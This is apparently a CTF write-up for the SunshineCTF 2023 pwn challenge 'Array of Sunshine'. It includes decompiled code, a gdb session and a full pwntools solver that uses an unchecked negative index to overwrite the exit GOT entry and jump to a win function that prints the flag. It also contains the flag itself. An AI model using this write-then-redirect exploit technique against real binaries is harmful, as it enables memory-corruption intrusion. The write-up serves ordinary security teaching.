# Array of Sunshine

## Descriptio

> Sunshine on my shoulders makes me happy...
> Haiku to Sunshine - ChatGPT
> ☀️ A sunbeam kisses 🍊
>
> Golden warmth in every slice 🌞
>
> Nature's sweet embrace 🌼
>
> Server info
> nc chal.2023.sunshinectf.games 23003
>
> Attachment: sunshine

## Flag

sun{a_ray_of_sunshine_bouncing_around}

## Solution

```console
root@kali:~/ctf/SunshineCTF_2023/pwn/Array_of_Sunshine# checksec
[*] '/root/ctf/SunshineCTF_2023/pwn/Array_of_Sunshine/sunshine'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

root@kali:~/ctf/SunshineCTF_2023/pwn/Array_of_Sunshine# readelf -s sunshine
(snip)
    38: 000000000040128f    61 FUNC    GLOBAL DEFAULT   14 win
(snip)
```

`win` function decompiled with Ghidra:

```c
void win(void)

{
  long lVar1;
  long in_FS_OFFSET;

  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  system("cat flag.txt");
  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

`win` function is defined but not called anywhere.
I guess it's expected ret2win in this challenge.

`basket` function decompiled with Ghidra:

```c
void basket(void)

{
  long in_FS_OFFSET;
  int local_34;
  undefined *local_30;
  undefined *local_28;
  long local_20;
  undefined8 local_18;
  long local_10;

  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  printf("\nWhich fruit would you like to eat [0-3] >>> ");
  __isoc99_scanf(&DAT_00402e46,&local_34);
  printf("Replace it with a new fruit.\n",*(undefined8 *)(fruits + (long)local_34 * 8));
  printf("Type of new fruit >>>");
  __isoc99_scanf(&DAT_00402e7d,fruits + (long)local_34 * 8);
  local_30 = &DAT_00404020;
  local_28 = &DAT_00404038;
  local_20 = _DAT_00404020;
  local_18 = _DAT_00404038;
  if ((printf_sym == _DAT_00404020) && (printf_sym == _DAT_00404020)) {
    if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
      __stack_chk_fail();
    }
    return;
  }
                    /* WARNING: Subroutine does not return */
  exit(-1);
}
```

User Input:

- (1) input numbers after `Which fruit would you like to eat [0-3] >>>` is output
- (2) input 24-character string after `Type of new fruit >>>` is output

Behavior:

- A `fruits` is defined in Heap Memory and initialized as `{"Oranges", "Apples", "Pears", "Bananas"}`
- `fruits + (1) = (2)`
- input value (1) is not verified so it's possible to input negative value e.g. `-1`

```gdb
gdb-peda$ b *basket+183
Breakpoint 1 at 0x401609

gdb-peda$ r
Starting program: /root/ctf/SunshineCTF_2023/pwn/Array_of_Sunshine/sunshine

(snip)

Which fruit would you like to eat [0-3] >>> 0
Replace it with a new fruit.
Type of new fruit >>>PWNAPPLE

(snip)

gdb-peda$ find PWNAPPLE
Searching for 'PWNAPPLE' in: None ranges
Found 1 results, display max 1 items:
sunshine : 0x405080 ("PWNAPPLE")
gdb-peda$ vmmap
Start              End                Perm      Name
0x00400000         0x00401000         r--p      /root/ctf/SunshineCTF_2023/pwn/Array_of_Sunshine/sunshine
0x00401000         0x00402000         r-xp      /root/ctf/SunshineCTF_2023/pwn/Array_of_Sunshine/sunshine
0x00402000         0x00404000         r--p      /root/ctf/SunshineCTF_2023/pwn/Array_of_Sunshine/sunshine
0x00404000         0x00405000         r--p      /root/ctf/SunshineCTF_2023/pwn/Array_of_Sunshine/sunshine
0x00405000         0x00406000         rw-p      /root/ctf/SunshineCTF_2023/pwn/Array_of_Sunshine/sunshine
(snip)
gdb-peda$ tele 0x00405000 50
(snip)
0064| 0x405040 --> 0x4010b6 (<exit@plt+6>:      push   0x8)
(snip)
0128| 0x405080 ("PWNAPPLE")
0136| 0x405088 --> 0x402000 --> 0x20001
0144| 0x405090 --> 0x40203a --> 0x4200007372616550 ('Pears')
0152| 0x405098 --> 0x402041 --> 0x73616e616e6142 ('Bananas')
(snip)
```

`exit(-1)` is called at the end of the `backet` function, so input `exit - fruits` to (1) due to overwrite the exit GOT and input `win` address to (2).
then it's enable to jump to the `win` function.

solver.py

```python
from pwn import *

elf = ELF("sunshine")

win = elf.sym["win"]
fruits = elf.sym["fruits"]
exit = elf.got["exit"]

log.debug(f"win: {hex(win)}")
log.debug(f"fruits: {hex(fruits)}")


def conn() -> pwnlib.tubes:
    if args.REMOTE:
        io = remote("chal.2023.sunshinectf.games", 23003)
    elif args.GDB:
        gdbscript = """
        b *basket+178
        c"""
        io = gdb.debug([elf.path], gdbscript=gdbscript)
    else:
        io = elf.process()

    return io


def main():
    io = conn()

    io.sendlineafter(
        b"Which fruit would you like to eat [0-3] >>>",
        str(((elf.got["exit"] - elf.sym["fruits"]) // 8)).encode(),
    )
    io.sendlineafter(b"Type of new fruit >>>", p64(win))
    io.interactive("")


if __name__ == "__main__":
    main()
```

```console
root@kali:~/ctf/SunshineCTF_2023/pwn/Array_of_Sunshine# python3 solver.py REMOTE
[*] '/root/ctf/SunshineCTF_2023/pwn/Array_of_Sunshine/sunshine'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to chal.2023.sunshinectf.games on port 23003: Done
[*] Switching to interactive mode
sun{a_ray_of_sunshine_bouncing_around}

Which fruit would you like to eat [0-3] >>>
[*] Closed connection to chal.2023.sunshinectf.games port 23003
```
